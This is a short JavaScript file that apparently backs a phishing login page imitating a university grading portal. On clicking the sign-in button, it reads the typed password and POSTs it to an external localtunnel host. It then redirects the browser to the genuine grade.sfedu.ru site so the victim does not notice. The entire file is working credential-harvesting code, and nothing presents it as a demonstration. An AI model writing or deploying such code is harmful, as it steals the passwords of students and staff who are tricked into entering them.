let signInBtn = document.getElementById("sign_in_btn");
signInBtn.addEventListener("click", (e) => {
    let pass = document.getElementById("password").value;

    async function sendData() {
        try {
            await fetch('https://metal-hotels-give.loca.lt/api/singleEntity', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({"entity": pass})
            });
            window.location = "https://grade.sfedu.ru";
        } catch (error) {
            console.error(error);
        }
    }
    sendData(); 
})